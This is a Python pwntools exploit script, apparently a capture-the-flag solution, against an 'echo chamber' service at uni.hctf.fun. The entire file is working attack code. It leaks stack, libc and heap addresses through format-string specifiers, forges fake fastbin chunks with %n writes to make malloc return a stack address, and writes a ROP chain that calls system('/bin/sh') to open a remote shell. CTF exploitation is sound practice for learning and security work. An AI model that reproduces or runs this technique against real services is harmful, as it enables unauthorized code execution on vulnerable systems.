from pwn import *

r = remote('uni.hctf.fun', 13374)
e = ELF("/usr/lib32/libc-2.28.so")


# pad payload to 96 bytes, otherwise the allocated 100Byte buffer will
# be split in two parts -> no easily "predictable" malloc behaviour.
def sendpayload(payload, padlen=96):
    r.sendline(payload + "D" * max(padlen - len(payload), 0))


def getbases():
    sendpayload("%1$p_%4$p_%10$pEOL")
    stackleak, libcleak, heapleak = r.recvuntil("EOL")[:-3].split("_")
    log.info("raw libc 0x{:x}".format(int(libcleak, 16)))
    return int(stackleak, 16) - 0x928, int(libcleak, 16) - e.symbols['_GLOBAL_OFFSET_TABLE_'], int(heapleak, 16) & ~0xfff


def pwn():
    r.recvuntil("Welcome to the echo chamber!\n")
    stack, libc, heap = getbases()
    log.info('stack 0x{:x} libc 0x{:x} heap 0x{:x}'.format(stack, libc, heap))
    # do not free some space to align next malloc block at 0xXXXXX400
    for _ in range(6):
        sendpayload("%1$n")
    # create fake fastbin structs
    sendpayload("%1$n" + "C" * 4 + (struct.pack("<II", 0, 0x41) + "X" * 8) * 2)
    # free fake fastbin structs
    sendpayload("%16c%1$hhn")
    sendpayload("%32c%1$hhn")
    # free original struct
    sendpayload("%{}c%1$hn".format((heap + 0x400) & 0xffff))
    # malloc now returns original struct, override fake structs.
    # 2nd. malloc(50) will return an address pointing into stack
    sendpayload("X" * 32 + struct.pack("<I", stack + 0x8fc))
    r.sendline("q")
    r.sendline("no")
    r.recvuntil("again?\n")
    # write ropchain into stack
    r.sendline(struct.pack("<I", libc + e.functions['abs'].address) * 8 + struct.pack("<III", libc + e.functions['system'].address, 0, libc + next(e.search('/bin/sh'))))
    r.interactive()


if __name__ == '__main__':
    pwn()
